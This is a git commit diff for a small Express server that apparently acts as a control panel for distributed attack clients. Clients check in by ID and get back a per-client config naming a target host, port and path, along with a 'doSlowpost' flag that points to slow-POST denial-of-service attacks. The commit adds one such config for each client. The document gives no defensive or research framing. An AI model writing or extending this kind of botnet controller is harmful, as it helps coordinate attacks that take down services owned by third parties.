4642631e8863c5016d0a36a5a0df05408092616c
Matthew Coal <matemate001@gmail.com>
2021-01-28 22:21:11 +0100

    feat: per-client configs

--- index.js
+++ index.js
@@ -5,6 +5,8 @@ const level = require('level');
 const db = level('db');
 const app = express();
 
+const baseConfig = {doTLS: true, doSlowpost: true, host: "", port: 443, path: "/", method: "POST"};
+
 app.use(express.json());
 app.use(express.static('public/'));
 
@@ -13,37 +15,49 @@ app.get('/xhr', async (_, res) => {
 });
 
 app.get('/config', async (_, res) => {
-  res.json(JSON.parse(await db.get('config')));
+  res.json(baseConfig);
 });
 
-app.post('/config', async (req, res) => {
-  await db.put('config', JSON.stringify(req.body));
+app.get('/configs', async (_, res) => {
+  res.json(JSON.parse(await db.get('configs')));
+});
+
+app.post('/configs/:id', async (req, res) => {
+  const origConf = JSON.parse(await db.get('configs'));
+  origConf[req.params.id] = req.body;
+  await db.put('configs', JSON.stringify(origConf));
   res.sendStatus(200);
 });
 
-app.get('/check', async (req, res) => {
-  const conf = JSON.parse(await db.get('config'));
-  try {
-    await got(`http${conf.doTLS ? 's' : ''}://${conf.host}:${conf.port}`);
-    res.send('true');
-  } catch (e) {
-    res.send('false');
-  }
-});
+// app.get('/check', async (req, res) => {
+//   const conf = JSON.parse(await db.get('configs'));
+//   try {
+//     await got(`http${conf.doTLS ? 's' : ''}://${conf.host}:${conf.port}`);
+//     res.send('true');
+//   } catch (e) {
+//     res.send('false');
+//   }
+// });
 
 app.post('/update/:id', async (req, res) => {
   const origUpd = JSON.parse(await db.get('updates'));
   await db.put('updates', JSON.stringify(Object.assign(origUpd, { [req.params.id]: new Date().getTime() })));
+
+  const origConf = JSON.parse(await db.get('configs'));
+  if (!Object.hasOwnProperty.call(origConf, req.params.id)) {
+    origConf[req.params.id] = baseConfig;
+    await db.put('configs', JSON.stringify(origConf));
+  }
   
   const orig = JSON.parse(await db.get('reports'));
   orig[req.params.id] = req.body;
   await db.put('reports', JSON.stringify(orig));
-  res.json(JSON.parse(await db.get('config')));
+  res.json(origConf[req.params.id]);
 });
 
 db.batch()
 .put('reports', '{}')
-.put('config', '{"doTLS":true,"doSlowpost":true,"host":"","port":443,"path":"/","method":"POST"}')
+.put('configs', '{}')
 .put('updates', '{}').write((err) => {
   if (err) return console.error('fatal: couldn\'t write to db');
 
